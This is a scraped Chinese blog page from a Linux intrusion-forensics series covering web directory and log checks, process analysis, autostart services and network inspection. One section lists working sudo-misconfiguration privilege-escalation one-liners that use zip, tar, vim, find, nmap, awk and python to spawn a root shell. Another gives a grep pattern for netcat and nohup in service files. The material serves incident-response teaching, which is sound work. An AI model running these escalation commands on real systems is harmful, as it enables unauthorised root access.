<h3 id="2-2-目录手工分析"><a href="#2-2-目录手工分析" class="headerlink" title="2.2 目录手工分析"></a>2.2 目录手工分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 下面两条适合对上传目录的粗筛</span></span><br><span class="line">grep -rn &quot;php\|&lt;%\|md5\|POST\|GET&quot; upload/</span><br><span class="line">find upload/ -name *.php *php* *.jsp *tml *.jar *.war</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 有备份文件时可以做备份比对</span></span><br><span class="line">vimdiff &lt;(cd $webroot_path; find . -exec md5sum &#123;&#125; \; | sort -k 2) &lt;(cd $webroot_bakpath; find . -exec md5sum &#123;&#125; \; | sort -k 2)</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">时间戳排序，注意最早及最晚的</span></span><br><span class="line">for i in `find /var/www/html/ -type f`;do a=`stat $i|sed -n 6p`; echo &quot;$a  $i&quot;; done |sort -nr</span><br></pre></td></tr></table></figure>

<h3 id="2-3-web日志分析"><a href="#2-3-web日志分析" class="headerlink" title="2.3 web日志分析"></a>2.3 web日志分析</h3><p>一般来说，web日志的数据量很大，对分析人员手工分析非常不友好。<br>下面给出默认情况下，常见web服务器的默认日志路径：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">debian-nginx:		/var/log/nginx/access.log</span><br><span class="line">debian-apache:		/var/log/apache2/access.log </span><br><span class="line">centos-apache:		/var/log/httpd/access_log</span><br><span class="line">centos-nginx:		/var/log/nginx/access.log </span><br></pre></td></tr></table></figure>

<p>如果支持web日志导出，可以使用一些web日志分析工具进行分析，这类工具是有一定片面性的，一者日志可能无法记录到post的内容，导致很多webshell事件会被漏报，二者在使用过程中可能还需要手工再次甄别分析结果。</p>
<p>360的星图日志分析 <a target="_blank" rel="noopener" href="https://www.jb51.net/softs/270178.html">https://www.jb51.net/softs/270178.html</a></p>
<p>在通过web查杀工具或web文件备份比对时，如果识别出了部分疑似文件，我们也能在日志中过滤一下，识别是否存在对该文件的访问进而确定攻击时间。</p>
<h2 id="3-提权类后门排查"><a href="#3-提权类后门排查" class="headerlink" title="3 提权类后门排查"></a>3 提权类后门排查</h2><p>提权后门的取证在实际场合下意义不大。</p>
<p>一般来说攻击者具备提权为root的能力后都会直接在root权限下做持久化，以免每一次登录都要走一遍提权流程很麻烦。</p>
<h3 id="3-1-suid-shell"><a href="#3-1-suid-shell" class="headerlink" title="3.1 suid shell"></a>3.1 suid shell</h3><p>方法就是检查所有属主的x位被置为s的文件。检查方式是使用包管理器检查或二进制逆向的方式检查所有输出的结果。<br>find / -perm -4000 -uid 0 2&gt;/dev/null</p>
<h3 id="3-2-sudo配置不当-受限命令绕过"><a href="#3-2-sudo配置不当-受限命令绕过" class="headerlink" title="3.2 sudo配置不当-受限命令绕过"></a>3.2 sudo配置不当-受限命令绕过</h3><p>部分自带参数执行shell命令的命令如果经sudo配置下发给普通用户，普通用户可以用该参数提权为root。但在实际场景下基本遇不到，即便sudo的配置存在该问题，如果历史记录没记录到就无法取证该事件。</p>
<p>这种场景下sudo配置文件常常添加了形如如下的配置：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">testme ALL=(ALL) NOPASSWD: /usr/bin/vi</span><br><span class="line">apache ALL=(root) NOPASSWD:/usr/bin/zip</span><br></pre></td></tr></table></figure>

<p>除了上面的命令vi与zip以外，还包括很多命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar/more/less/man/ftp/python/vim/find/strace/git/passwd/awk</span><br></pre></td></tr></table></figure>

<p>对应攻击者进行利用的方式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sudo zip ./7.zip /tmp -T --unzip-command=&quot;sh -c /bin/bash&quot;</span><br><span class="line">sudo tar cf /dev/null test.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash</span><br><span class="line">sudo more /tmp/a.txt ; !/bin/bash</span><br><span class="line">sudo less /tmp/a.txt; !/bin/bash</span><br><span class="line">sudo man ssh; !/bin/bash</span><br><span class="line">sudo ftp; !/bin/bash</span><br><span class="line">sudo vim -c &#x27;!sh&#x27;</span><br><span class="line">sudo find /bin/ -name ls -exec &#x27;/bin/bash&#x27; \;</span><br><span class="line">sudo strace -o /dev/null /bin/bash</span><br><span class="line">echo &quot;os.execute(&#x27;/bin/bash&#x27;)&quot; &gt; /tmp/shell.nse</span><br><span class="line">sudo nmap --script=/tmp/shell.nse</span><br><span class="line">sudo git help status;!/bin/bash</span><br><span class="line">sudo passwd</span><br><span class="line">sudo awk &#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br><span class="line">sudo /usr/bin/python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="3-3-目录或文件与进程的属主不一致导致提权"><a href="#3-3-目录或文件与进程的属主不一致导致提权" class="headerlink" title="3.3 目录或文件与进程的属主不一致导致提权"></a>3.3 目录或文件与进程的属主不一致导致提权</h3><p>由root等高权限用户周期性调用执行的文件 被部署在其他用户的家目录下（或该文件的属主为其他用户时），则当该用户失陷时，攻击者可以篡改该文件的内容，诱导root执行高风险的操作。</p>
<p>实际场景下很难取证，因此不做展开。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(7)-%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(7)-%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">Linux入侵事件取证(7)-异常进程分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:08" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:08-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:26:23" itemprop="dateModified" datetime="2021-06-21T19:26:23-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="异常进程分析"><a href="#异常进程分析" class="headerlink" title="异常进程分析"></a>异常进程分析</h1><h2 id="1-进程基本信息获取"><a href="#1-进程基本信息获取" class="headerlink" title="1 进程基本信息获取"></a>1 进程基本信息获取</h2><p>我们可以使用以下命令获得系统内的进程信息，重点关注进程的资源占用及uid信息是否存在异常。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查看系统内的进程列表并给出相应的基本信息</span></span><br><span class="line">ps -ef</span><br><span class="line">ps auxfww #能看到启动该进程时输入的命令</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看某进程的线程</span></span><br><span class="line">ps -Lf $pid</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看父子进程树</span></span><br><span class="line">pstree</span><br><span class="line"><span class="meta">#</span><span class="bash"> 其他</span></span><br><span class="line">htop || top</span><br></pre></td></tr></table></figure>

<h2 id="2-进程与网络"><a href="#2-进程与网络" class="headerlink" title="2 进程与网络"></a>2 进程与网络</h2><h3 id="2-1-知端口找进程"><a href="#2-1-知端口找进程" class="headerlink" title="2.1 知端口找进程"></a>2.1 知端口找进程</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:80 #得pid</span><br><span class="line">pstree -p $pid #得进程树</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntaup|grep $port #得pid，等效于ss -ntaup|grep $port </span><br><span class="line">ps axu|grep $pid #得进程</span><br></pre></td></tr></table></figure>

<h3 id="2-2-知进程找端口"><a href="#2-2-知进程找端口" class="headerlink" title="2.2 知进程找端口"></a>2.2 知进程找端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux|grep $proc_name 查看第二列获得pid</span><br><span class="line">netstat -ntaup|grep $pid</span><br></pre></td></tr></table></figure>

<h3 id="2-3-知进程找raw-socket"><a href="#2-3-知进程找raw-socket" class="headerlink" title="2.3 知进程找raw_socket"></a>2.3 知进程找raw_socket</h3><p>常规的网络通信流量都是基于TCP/UDP实现的，基本都处于传输层及应用层。然而在网络攻击场景下，部分攻击者为了达到躲避隐藏的目的，会让失陷主机通过诸如ICMP这样的网络层协议与攻击机进行通信，这时可以过滤系统内绑定了原始套接字（sock_raw）的进程进行分析。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">netstat -awp</span><br><span class="line">ss -awp</span><br><span class="line"><span class="meta">#</span><span class="bash">或者</span></span><br><span class="line">lsof | grep raw</span><br></pre></td></tr></table></figure>

<h2 id="3-进程与命令"><a href="#3-进程与命令" class="headerlink" title="3 进程与命令"></a>3 进程与命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps auxfww|grep $pid</span><br><span class="line">cat /proc/$pid/cmdline|xxd</span><br></pre></td></tr></table></figure>

<h2 id="4-进程与文件"><a href="#4-进程与文件" class="headerlink" title="4 进程与文件"></a>4 进程与文件</h2><h3 id="4-1-查看启动进程的二进制文件"><a href="#4-1-查看启动进程的二进制文件" class="headerlink" title="4.1 查看启动进程的二进制文件"></a>4.1 查看启动进程的二进制文件</h3><p>使用ps</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">最后一列获得命令文件的路径，可能是相对路径，需要whereis或find一下。</span></span><br><span class="line">ps auxfww</span><br></pre></td></tr></table></figure>

<p>使用readlink</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readlink /proc/$&#123;pid&#125;/exe</span><br></pre></td></tr></table></figure>

<ul>
<li>ps: 定位文件后常要进一步分析是否被篡改或有恶意行为</li>
</ul>
<h3 id="4-2-查看进程访问的文件"><a href="#4-2-查看进程访问的文件" class="headerlink" title="4.2 查看进程访问的文件"></a>4.2 查看进程访问的文件</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lsof -p $pid</span><br><span class="line"><span class="meta">#</span><span class="bash">FD列为r/u/w的代表读写操作，txt为程序绝对路径，cwd为目录，mem为使用的库文件</span></span><br><span class="line"></span><br><span class="line">ls -al /proc/$pid/fd/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 都是软链接，软链接指向的信息给出了进程占用的文件。</span></span><br><span class="line"></span><br><span class="line">lsof $filename</span><br><span class="line">ps aux|grep $pid</span><br><span class="line"><span class="meta">#</span><span class="bash">定位占用某文件的进程</span></span><br></pre></td></tr></table></figure>

<h2 id="5-进程与函数调用"><a href="#5-进程与函数调用" class="headerlink" title="5 进程与函数调用"></a>5 进程与函数调用</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">使用以下工具可以查看到进程生命周期中调用的一些系统库函数，这些函数能帮助初步识别进程的行为与功能。</span></span><br><span class="line">strace -p $pid</span><br><span class="line">ltrace -p $pid</span><br></pre></td></tr></table></figure>

<h2 id="6-proc-pid目录"><a href="#6-proc-pid目录" class="headerlink" title="6 /proc/$pid目录"></a>6 /proc/$pid目录</h2><p>/proc/$pid/下记录了某个进程获取及分配的各种资源。这些资源在取证及文件恢复时有很大作用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/proc/$pid/cmdline：指示创建当前进程时输入的命令</span><br><span class="line">/proc/$pid/cwd：指示启动该进程时所处的目录</span><br><span class="line">/proc/$pid/environ：指示进程运行时的环境变量</span><br><span class="line">/proc/$pid/exe:是进程依赖的二进制的软链接。</span><br><span class="line">/proc/$pid/root：指示系统根目录的软链接。一般为/。</span><br><span class="line">/proc/$pid/fd：进程运行中申请的所有所有文件描述符。包括普通文件读写，标准输入输出错误，管道以及socket。</span><br><span class="line">/proc/$pid/mem：内存空间，不能直接看，要通过maps，map_file/*进行辅助分析。</span><br><span class="line">/proc/$pid/maps：进程分配的内存表。可以当作是map_files的索引文件。文件名是一段地址范围。</span><br><span class="line">/proc/$pid/maps_files:包括maps指示的各地址段的内存映像。可以进行关键字搜索或逆向分析。</span><br><span class="line">/proc/$pid/stacks：当前时刻主线程函数调用栈。</span><br><span class="line">/proc/$pid/task：当前时刻子线程函数调用栈。</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(6)-%E8%87%AA%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(6)-%E8%87%AA%E5%90%AF%E5%8A%A8%E6%9C%8D%E5%8A%A1/" class="post-title-link" itemprop="url">Linux入侵事件取证(6)-自启动服务</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:07" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:07-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:26:19" itemprop="dateModified" datetime="2021-06-21T19:26:19-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="自启动服务检查"><a href="#自启动服务检查" class="headerlink" title="自启动服务检查"></a>自启动服务检查</h1><p>自启动顾名思义伴随操作系统启动后自动运行的脚本或命令。Linux下关于自启动管理最常见的是使用systemd、init.d，前者是后者的替代，目前已经默认启用于大多数Linux发行版中。</p>
<p>攻击者获得主机root权限后，可以在自启动脚本目录部署自己的自启动服务，达到每次开机就运行的目的。排查的重点主要集中于当前自启动级别下目录文件的排查。</p>
<h2 id="1-systemd检查"><a href="#1-systemd检查" class="headerlink" title="1 systemd检查"></a>1 systemd检查</h2><p>systemd自启动脚本的位置有以下三处，在实际场景中，攻击者常将自启动脚本部署于第一处：</p>
<ul>
<li><p>/etc/systemd/system/ 系统管理员安装的自启动单元, 优先级更高</p>
</li>
<li><p>/run/system/system: 系统执行过程中所产生的服务脚本，优先级次之，一般可忽略。</p>
</li>
<li><p>[/usr]/lib/systemd/system/ 软件安装的自启动单元</p>
</li>
</ul>
<p>给出两种思路。</p>
<h3 id="1-1-通过systemctl命令"><a href="#1-1-通过systemctl命令" class="headerlink" title="1.1 通过systemctl命令"></a>1.1 通过systemctl命令</h3><p>过滤出系统内默认启动的自启动任务</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files --type service |grep enabled</span><br><span class="line">find / -name rtkit-daemon.service|grep -v &quot;/sys&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash">通过检查该service文件内部是否含有通信、启动未知文件的操作初步进行识别。</span></span><br><span class="line"><span class="meta">#</span><span class="bash">最后，通过检查与网上搜索确定了该文件是安全文件，只是名字比较奇葩而已。</span></span><br></pre></td></tr></table></figure>

<h3 id="1-2-手工分析"><a href="#1-2-手工分析" class="headerlink" title="1.2 手工分析"></a>1.2 手工分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 简单过滤出含有疑似特殊字符的service文件</span></span><br><span class="line">grep &quot;sh\\|nc \\|./\\|nohup\\|cat&quot; -rl /lib/systemd/system/</span><br><span class="line">grep &quot;sh\\|nc \\|./\\|nohup\\|cat&quot; -rl /lib/systemd/system/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 手工分析service文件中的内容</span></span><br></pre></td></tr></table></figure>



<h2 id="2-init检查"><a href="#2-init检查" class="headerlink" title="2 init检查"></a>2 init检查</h2><p>早期，init自启动脚本的位置主要集中于/etc/rc.d/*。后来，其中的内容直接放到了/etc目录下。一些系统中二者同时存在（为了兼容性建立了符号连接）。init服务作为过时的服务，有很多问题，目前不少系统已经默认关闭了init管理器。</p>
<p>Linux系统有0~6共7个运行等级，最常见的是3(多用户)，5(图形化)。使用runlevel（或who -r或直接查看/etc/inittab）确定运行等级后有针对性地分析。 </p>
<p>如前所述，如果分析的设备属于老版本的Linux。需要关注以下文件或目录中有无攻击者定义的恶意脚本:</p>
<p>/etc/rc.d/rc{0..6}.d /etc/rc.d/rc.local /etc/rc.d/init.d/* /etc/rc.d/rc.sysinit</p>
<p>/etc/rc{0..6}.d /etc/rc.local /etc/init.d/*</p>
<p>可以从几个方面分析自启动脚本/任务。</p>
<ol>
<li><p>分析/etc/rc.d/rc.sysinit。</p>
</li>
<li><p>分析/etc/rc.d/rc${RUN_LEVEL}.d/S*。</p>
</li>
<li><p>分析/etc/rc.d/rc.local。</p>
</li>
</ol>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(5)-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(5)-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" class="post-title-link" itemprop="url">Linux入侵事件取证(5)-定时任务</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:05" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:05-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:26:15" itemprop="dateModified" datetime="2021-06-21T19:26:15-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="网络检查"><a href="#网络检查" class="headerlink" title="网络检查"></a>网络检查</h1><h2 id="1-异常通信进程"><a href="#1-异常通信进程" class="headerlink" title="1 异常通信进程"></a>1 异常通信进程</h2><p>netstat与ss命令互为替代。</p>
<ul>
<li>ps:从这开始就要特别关注取证命令有没有可能被篡改了。被篡改的命令可能有针对性的屏蔽关键字或rootkit进程。怎么排除干扰后面会专门拉出来说。</li>
</ul>
<p>以下两命令给出系统内已有的所有绑定了tcp&amp;udp端口的通信，-a表示all（listen/establish/…）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/netstat -ntuap</span><br><span class="line">/usr/bin/ss -ntuap</span><br></pre></td></tr></table></figure>

<p>隐蔽通信(例如使用icmp隧道)可能使用非tcp/udp的原始套接字（sock_raw）。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -awp</span><br><span class="line">ss -awp</span><br><span class="line">lsof | grep raw</span><br></pre></td></tr></table></figure>



<h2 id="2-异常配置检查"><a href="#2-异常配置检查" class="headerlink" title="2 异常配置检查"></a>2 异常配置检查</h2><p>用处不太大，有时能帮助识别潜在风险。</p>
<h3 id="2-1-dns配置"><a href="#2-1-dns配置" class="headerlink" title="2.1 dns配置"></a>2.1 dns配置</h3><p>关注异常的dns服务器地址，dns服务被劫持可用于流量劫持与钓鱼。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 本地 主机名=》ip映射表</span></span><br><span class="line">cat /etc/hosts</span><br><span class="line"><span class="meta">#</span><span class="bash"> dns服务配置文件</span></span><br><span class="line">cat /etc/resolv.conf</span><br></pre></td></tr></table></figure>

<p>如果自身为dns服务器且安装nscd服务时，可能特别关注缓存有无被篡改。<br>配置文件地址及日志：/etc/nscd.conf /var/log/nscd.log<br>缓存地址：/var/db/nscd/（如果有nscd服务，对应于dns缓存）</p>
<h3 id="2-2-访问控制配置"><a href="#2-2-访问控制配置" class="headerlink" title="2.2 访问控制配置"></a>2.2 访问控制配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/hosts.allow	白名单</span><br><span class="line">/etc/hosts.deny		黑名单</span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line">iptables -L</span><br></pre></td></tr></table></figure>

<h3 id="2-3-仓库源检查"><a href="#2-3-仓库源检查" class="headerlink" title="2.3 仓库源检查"></a>2.3 仓库源检查</h3><p>防止仓库地址被篡改造成潜在风险的供应链攻击风险。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Debian系：</span></span><br><span class="line">/etc/apt/sources.list</span><br><span class="line">/etc/apt/sources.list.d/</span><br><span class="line"><span class="meta">#</span><span class="bash"> RHEL系：</span></span><br><span class="line">/etc/yum.repos.d/</span><br></pre></td></tr></table></figure>

<h3 id="2-4-网卡工作模式"><a href="#2-4-网卡工作模式" class="headerlink" title="2.4 网卡工作模式"></a>2.4 网卡工作模式</h3><p>局域网嗅探时，网卡往往被设置为混杂模式。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a|grep &quot;UPBROADCAST RUNNING PROMISC MULTICAST&quot;</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(4)-%E7%BD%91%E7%BB%9C%E6%A3%80%E6%9F%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="aplyc1a">
      <meta itemprop="description" content="Always good to see">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="aplyc1a's blogs">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/06/22/Linux%E5%85%A5%E4%BE%B5%E7%97%95%E8%BF%B9%E5%8F%96%E8%AF%81(4)-%E7%BD%91%E7%BB%9C%E6%A3%80%E6%9F%A5/" class="post-title-link" itemprop="url">Linux入侵事件取证(4)-网络检查</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-06-22 10:16:04" itemprop="dateCreated datePublished" datetime="2021-06-22T10:16:04-08:00">2021-06-22</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-06-21 19:26:10" itemprop="dateModified" datetime="2021-06-21T19:26:10-08:00">2021-06-21</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="网络检查"><a href="#网络检查" class="headerlink" title="网络检查"></a>网络检查</h1><h2 id="1-异常通信进程"><a href="#1-异常通信进程" class="headerlink" title="1 异常通信进程"></a>1 异常通信进程</h2><p>netstat与ss命令互为替代。</p>
<ul>
<li>ps:从这开始就要特别关注取证命令有没有可能被篡改了。被篡改的命令可能有针对性的屏蔽关键字或rootkit进程。怎么排除干扰后面会专门拉出来说。</li>
</ul>
<p>以下两命令给出系统内已有的所有绑定了tcp&amp;udp端口的通信，-a表示all（listen/establish/…）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/netstat -ntuap</span><br><span class="line">/usr/bin/ss -ntuap</span><br></pre></td></tr></table></figure>

<p>隐蔽通信(例如使用icmp隧道)可能使用非tcp/udp的原始套接字（sock_raw）。</p>
